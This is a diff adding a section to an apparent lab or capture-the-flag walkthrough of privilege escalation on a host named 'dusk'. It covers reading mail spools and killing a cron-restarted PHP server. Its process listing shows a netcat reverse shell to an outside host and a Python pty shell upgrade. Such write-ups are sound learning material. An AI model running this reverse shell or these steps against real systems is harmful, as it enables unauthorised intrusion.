@@ -82,6 +82,8 @@ User www-data may run the following commands on dusk:
 
 `ping` and `sl` won't provide anything. `make` looked promising, but even though I can execute commands with it they don't run as dusk, just me as www-data.
 
+## Server resetting (a dead end)
+
 However, given this server has smtp, I browsed to /var/spool/mail and found three files, for dusk, root and www-data. I copied this into /var/tmp so I could read it better, and it contains many messages that are identical (except for time):
 
 ```
@@ -106,3 +108,32 @@ Date: Sat, 30 Nov 2019 17:50:01 -0500 (EST)
 
 [Sat Nov 30 17:50:01 2019] Failed to listen on 192.168.1.167:8080 (reason: Address already in use)
 ```
+
+Later it switches the dir from /tmp/ to /var/tmp. There was an email every minute. 
+
+To me, this looked like dusk is trying to start a php webserver, but can't because www-data already has.
+
+I ran `ps -U www-data -o "%P %c %a"` to see the running commands www-data has done:
+
+```
+PPID COMMAND         COMMAND
+  651 apache2         /usr/sbin/apache2 -k start
+  651 apache2         /usr/sbin/apache2 -k start
+  651 apache2         /usr/sbin/apache2 -k start
+  651 apache2         /usr/sbin/apache2 -k start
+  651 apache2         /usr/sbin/apache2 -k start
+ 1141 sh              /bin/sh -c /usr/bin/php -S 0.0.0.0:8080 -t /var/tmp
+ 1143 php             /usr/bin/php -S 0.0.0.0:8080 -t /var/tmp
+  651 apache2         /usr/sbin/apache2 -k start
+ 1146 sh              sh -c nc 192.168.1.3 4444 -e /bin/bash
+ 1517 bash            bash
+ 1518 python          python -c import pty;pty.spawn('/bin/bash');
+ 1528 bash            /bin/bash
+ 1529 ps              ps -U www-data -o %P %c %a
+```
+
+In theory, if I killed `1141` or `1143`, above, then the cron job should start a new server as dusk, right?
+
+Before trying, I ran `/usr/bin/php -S 0.0.0.0:8081 -t /var/tmp` to start a secondary server as www-data.
+
+When I killed the server, it came back shortly. Doing a whoami, however, revealed it was still www-data. Relooking at the mail message, and examining the new logs, I saw it was actually restarting the server for www-data, not dusk /facepalm
